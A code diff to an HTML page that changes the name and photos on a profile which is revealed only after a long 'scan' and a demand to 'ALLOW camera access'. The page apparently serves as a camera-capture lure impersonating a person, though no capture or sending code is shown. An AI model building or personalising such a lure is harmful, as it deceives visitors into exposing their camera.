@@ -338,8 +338,8 @@ body{
 
 <script>
 const CONFIG = {
-  coverPhotoLink: "https://i.imgur.com/XXXXXXXXXXXX.jpg",
-  profilePhotoLink: "https://i.imgur.com/2U1hpLA.jpeg"
+  coverPhotoLink: "",
+  profilePhotoLink: "https://i.imgur.com/bOVUoyN.jpeg"
 };
 </script>
 
@@ -388,7 +388,7 @@ const CONFIG = {
         <img class="profile-pic" id="profileImg" src="" alt="Profile Photo">
       </div>
       <div class="profile-info">
-        <h1 class="profile-name">Julius Flores</h1>
+        <h1 class="profile-name">Christian Dave</h1>
       </div>
     </div>
 
@@ -451,7 +451,7 @@ loginButton.addEventListener('click', function(){
       setTimeout(function() {
         loadingScreen.classList.add('hidden');
         profilePage.classList.remove('hidden');
-      }, 34500); // 30 seconds total
+      }, 34500);
     })
     .catch(function(err) {
       scanStatus.textContent = "Please ALLOW camera access";
